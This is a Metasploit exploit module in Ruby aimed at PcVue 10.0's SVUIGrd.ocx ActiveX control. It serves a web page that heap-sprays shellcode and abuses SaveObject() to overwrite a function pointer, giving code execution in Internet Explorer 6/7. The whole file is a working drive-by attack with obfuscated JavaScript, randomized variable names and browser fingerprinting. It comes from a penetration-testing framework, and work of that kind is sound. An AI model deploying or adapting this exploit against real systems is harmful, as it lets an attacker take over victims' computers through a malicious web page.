# $Id: pcvue_func.rb 13889 2011-10-12 10:57:31Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => "PcVue 10.0 SV.UIGrdCtrl.1 &#039;LoadObject()/SaveObject()&#039; Trusted DWORD Vulnerability",
            &#039;Description&#039;    => %q{
                This module exploits a function pointer control within SVUIGrd.ocx of PcVue 10.0.
                By setting a dword value for the SaveObject() or LoadObject(), an attacker can
                overwrite a function pointer and execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;, # original find
                    &#039;mr_me <steventhomasseeley[at]gmail-com>&#039;,     # msf module
                    &#039;TecR0c <roccogiovannicalvi[at]gmail-com >&#039;,# msf module
                ],
            &#039;Version&#039;        => &#039;$Revision: 13889 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;49795&#039;],
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/pcvue_1-adv.txt&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 1024,
                    &#039;BadChars&#039;        => "\x00\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        #IE 6/7 on Widnows XP and Vista
                        &#039;Internet Explorer 6 / Internet Explorer 7&#039;,
                        {
                            &#039;Ret&#039;    => 0x0a0a0a0a,
                            &#039;Offset&#039; => 1000
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;Oct 5 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;,  &#039;msf.html&#039;]),
                    OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript Obfuscation&#039;, true]),
                ], self.class)
    end
 
    def on_request_uri(cli, request)
 
        #If not IE, we don&#039;t continue
        agent = request.headers[&#039;User-Agent&#039;]
        if agent !~ /MSIE [6|7]\.0/
            print_error("Target not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
 
        # Encode the shellcode
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
 
        # Setup exploit buffers
        nops      = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))
        ret       = "0x%08x" % target.ret
 
        blocksize = 0x50000
        fillto    = 200
 
        # Randomize the javascript variable names
        obj_name     = rand_text_alpha(rand(100) + 1)
        j_shellcode  = rand_text_alpha(rand(100) + 1)
        j_nops       = rand_text_alpha(rand(100) + 1)
        j_ret        = rand_text_alpha(rand(100) + 1)
        j_headersize = rand_text_alpha(rand(100) + 1)
        j_slackspace = rand_text_alpha(rand(100) + 1)
        j_fillblock  = rand_text_alpha(rand(100) + 1)
        j_block      = rand_text_alpha(rand(100) + 1)
        j_memory     = rand_text_alpha(rand(100) + 1)
        j_counter    = rand_text_alpha(rand(30) + 2)
        j_txt        = rand_text_alpha(rand(8) + 4)
 
        js = <<-EOF
        var #{j_shellcode} = unescape(&#039;#{shellcode}&#039;);
        var #{j_nops} = unescape("#{nops}");
        var #{j_headersize} = 20;
        var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
        while(#{j_nops}.length < #{j_slackspace}) {
                #{j_nops} += #{j_nops};
        }
        var #{j_fillblock} = #{j_nops}.substring(0, #{j_slackspace});
        var #{j_block} = #{j_nops}.substring(0, #{j_nops}.length - #{j_slackspace});
        while((#{j_block}.length + #{j_slackspace}) < #{blocksize}) {
                #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
        }
 
        #{j_memory} = new Array();
        for(#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++){
                #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode} ;
        }
 
        function main(){
            #{obj_name}.SaveObject("#{j_txt}.txt", #{ret}, 0);
        }
        EOF
 
        js = js.gsub(/^\t\t/, &#039;&#039;)
 
        #JS obfuscation on demand
        if datastore[&#039;OBFUSCATE&#039;]
            js = ::Rex::Exploitation::JSObfu.new(js)
            js.obfuscate
            main_sym = js.sym(&#039;main&#039;)
        else
            main_sym = "main"
        end
 
        content = <<-EOF
        <html>
        <body>
        <object classid=&#039;clsid:2BBD45A5-28AE-11D1-ACAC-0800170967D9&#039; id=&#039;#{obj_name}&#039; ></object>
        <script language=&#039;javascript&#039;>
        #{js}
        #{main_sym}();
        </script>
        </body>
        </html>
        EOF
 
        #Remove the extra tabs from content
        content = content.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}")
        send_response(cli, content, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
end
 
 
=begin
Tested successfully on the following platforms:
 - PcVue 10.0 (SVUIGrd.ocx v1.5.1.0) on Internet Explorer 6 & 7, Windows XP SP3
 
Class SVUIGrdCtrl
ProgID: SV.UIGrdCtrl.1
GUID: {2BBD45A5-28AE-11D1-ACAC-0800170967D9}
Number of Interfaces: 1
Default Interface: ISVUIGrd
RegKey Safe for Script: False
RegkeySafe for Init: False
KillBitSet: False
=end



